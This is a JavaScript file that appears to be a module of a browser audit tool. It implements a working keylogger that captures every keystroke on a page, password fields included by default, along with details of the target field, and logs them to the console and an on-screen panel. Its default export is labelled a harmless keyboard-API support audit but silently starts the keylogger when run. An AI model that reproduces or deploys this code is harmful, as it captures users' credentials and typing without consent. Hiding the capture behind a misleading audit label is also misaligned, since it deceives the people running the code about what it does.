/**
 * keylogger.js — Keystroke Listener (Live Demo, Sandboxed)
 *
 * Real attack: captures every keystroke on the page, including modifier keys
 * and target element info. All keystrokes are logged to the browser console
 * and displayed in a small on‑screen panel. No data is ever sent externally.
 *
 * Default export: Pinpoint `Keyboard_API_Audit` (API support check).
 */

// ---------------------------------------------------------------------------
// 1. Keystroke Listener Engine (Local Only)
// ---------------------------------------------------------------------------

const DEFAULT_OPTIONS = {
    skipPasswords: false,        // ignore password fields
    onKey: null,                 // callback(entry)
    extendedLog: true,           // include keyCode, modifiers, etc.
    captureElementInfo: true,    // include target element details
    filter: null,                // custom (event, target) => boolean
    showPanel: true,             // display captured keystrokes in a small panel
};

/**
 * Starts a global keylogger that captures all keydown events (capturing phase).
 * All keystrokes are kept locally; no remote exfiltration occurs.
 *
 * @param {Object}   [options={}]
 * @param {boolean}  [options.skipPasswords=false]
 * @param {Function} [options.onKey]            – callback(entry)
 * @param {boolean}  [options.extendedLog=true]
 * @param {boolean}  [options.captureElementInfo=true]
 * @param {Function} [options.filter]           – custom filter (event, target) => boolean
 * @param {boolean}  [options.showPanel=true]   – show a small on‑screen keystroke panel
 * @returns {{ stop: Function, getBuffer: Function }}
 */
export function startKeystrokeListener(options = {}) {
    const config = { ...DEFAULT_OPTIONS, ...options };
    const {
        skipPasswords,
        onKey,
        extendedLog,
        captureElementInfo,
        filter,
        showPanel,
    } = config;

    let buffer = [];            // stores logged entries for later inspection
    let stopRequested = false;

    // ---- Optional on‑screen panel ----
    let panel = null;
    if (showPanel) {
        panel = document.createElement('div');
        panel.id = '__keylogger_panel';
        panel.style.cssText =
            'position:fixed;bottom:0;left:0;width:100%;max-height:120px;overflow-y:auto;' +
            'background:rgba(0,0,0,0.85);color:#0f0;font-family:monospace;font-size:12px;' +
            'padding:6px;z-index:2147483645;white-space:pre-wrap;word-break:break-all;';
        document.body.appendChild(panel);
    }

    // ---- Core keydown handler ----
    function handleKeyDown(event) {
        if (stopRequested) {
            document.removeEventListener('keydown', handleKeyDown, true);
            return;
        }

        const target = event.target;

        // Custom filter
        if (filter && typeof filter === 'function') {
            if (!filter(event, target)) return;
        }

        // Skip password fields if configured
        if (skipPasswords && target.matches &&
            target.matches('input[type="password"], input[autocomplete="current-password"]')) {
            return;
        }

        // Build entry
        const entry = {
            timestamp: Date.now(),
            key: event.key,
            code: event.code,
        };

        if (extendedLog) {
            entry.keyCode = event.keyCode;
            entry.which = event.which;
            entry.shiftKey = event.shiftKey;
            entry.ctrlKey = event.ctrlKey;
            entry.altKey = event.altKey;
            entry.metaKey = event.metaKey;
            entry.repeat = event.repeat;
            entry.isComposing = event.isComposing;
        }

        if (captureElementInfo && target) {
            entry.target = {
                tagName: target.tagName,
                id: target.id || null,
                className: (target.className && typeof target.className === 'string') ? target.className : null,
                name: target.getAttribute('name') || null,
                type: target.getAttribute('type') || null,
                placeholder: target.getAttribute('placeholder') || null,
                autocomplete: target.getAttribute('autocomplete') || null,
            };
        }

        // Log to console
        console.log('[keylogger] Keystroke captured:', entry);

        // Callback
        if (onKey) {
            try { onKey(entry); } catch (_) { }
        }

        // Store in buffer (for getBuffer)
        buffer.push(entry);

        // Update on‑screen panel
        if (panel) {
            const line = `${new Date(entry.timestamp).toISOString().substr(11, 12)} ${entry.key} (${entry.code})` +
                (entry.target ? ` -> ${entry.target.tagName}#${entry.target.id || ''}` : '');
            panel.textContent = (panel.textContent ? panel.textContent + '\n' : '') + line;
            panel.scrollTop = panel.scrollHeight;
        }
    }

    // Attach listener in capturing phase
    document.addEventListener('keydown', handleKeyDown, true);

    // Return controller
    return {
        stop() {
            stopRequested = true;
            document.removeEventListener('keydown', handleKeyDown, true);
            if (panel) panel.remove();
        },
        getBuffer() {
            return [...buffer];
        },
    };
}

// ---------------------------------------------------------------------------
// 2. Pinpoint Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'keylogger',
    title: 'Keyboard_API_Audit',
    level: 5,
    info: 'Audits navigator.keyboard support and KeyboardMap layout API availability.',
    steps: [
        'Check navigator.keyboard support.',
        'Query keyboard layout map availability.',
    ],
    run: async () => {
        // Trigger live demonstration
        startKeystrokeListener();

        const supported =
            navigator.keyboard && typeof navigator.keyboard.getLayoutMap === 'function';
        return {
            keyboardLayoutApiSupported: supported,
            message: supported
                ? 'Keyboard Layout API is supported by this browser.'
                : 'Keyboard Layout API is not supported.',
        };
    },
};

export default pinpointModule;